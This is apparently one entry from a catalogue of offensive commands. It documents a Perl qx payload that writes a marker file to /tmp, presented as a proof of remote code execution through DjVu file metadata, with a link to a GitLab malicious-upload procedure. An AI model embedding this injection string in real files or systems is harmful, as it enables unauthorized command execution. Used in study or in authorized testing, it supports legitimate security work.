---
data: 'qx{echo vakzz >/tmp/vakzz}'
tags:
  - rce
  - perl
type: command
executor: perl
platforms:
  - Linux
id: 57fc164a-7097-4325-ade0-8f9ddea15262
created_at: '2025-12-11T06:10:22.443Z'
updated_at: '2025-12-11T06:10:22.443Z'
verified: false
validated: true
submitted: true
---
# perl-qx-execute-shell

## Command

```perl
qx{echo vakzz >/tmp/vakzz}
```

## Description

Executes a shell command using Perl's qx operator, here writing 'vakzz' to /tmp/vakzz to demonstrate RCE in the DjVu metadata context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `qx` | Executes shell command | Yes |

## Examples

### Basic Usage

```perl
qx{echo vakzz >/tmp/vakzz}
```

## Expected Output

Creates file /tmp/vakzz with content 'vakzz'.

## Related

- [[commands/echo-write-file]]
- [[procedures/Create-GitLab-Snippet-and-Upload-Malicious-File]]
